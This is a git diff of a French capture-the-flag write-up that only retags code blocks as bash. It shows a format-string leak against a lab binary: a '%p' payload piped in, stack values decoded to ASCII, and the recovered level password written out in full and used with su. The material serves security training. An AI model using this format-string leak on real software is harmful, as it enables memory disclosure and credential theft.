@@ -1,6 +1,6 @@
 Je commence par analyser mon environnement :
 
-```
+```bash
 $ id && pwd && ls -la
 uid=1002(level02) gid=1002(level02) groups=1002(level02),100(users)
 /home/users/level02
@@ -17,7 +17,7 @@ lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
 
 Je trouve un binaire `level02`, que je tente d'éxecuter :
 
-```
+```bash
 $ ./level02
 ===== [ Secure Access System v1.0 ] =====
 /***************************************\
@@ -105,7 +105,7 @@ Je ne peux pas utiliser de `break` dans `gdb` pour investiguer où se trouve la 
 
 Je vais donc "bruteforcer" la lecture de la stack au travers d'un petit script python :
 
-```
+```bash
 $ python -c 'print("%p " * 100)'| ./level02
 ===== [ Secure Access System v1.0 ] =====
 /***************************************\
@@ -119,7 +119,7 @@ J'ai autant d'adresse si je tente avec 200, je peux donc raisonnablement imagine
 
 Je tente une conversion HEX -> ASCII des adresses les plus suspicieuse (que j'ai mis entre crochet) :
 
-```
+```bash
 0x756e505234376848 -> Hh74RPnu
 0x45414a3561733951 -> Q9sa5JAE
 0x377a7143574e6758 -> XgNWCqz7
@@ -129,7 +129,7 @@ Je tente une conversion HEX -> ASCII des adresses les plus suspicieuse (que j'ai
 
 Cela ressemble donc fort à un mot de passe, je le tente : 
 
-```
+```bash
 $ su level03
 Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
 
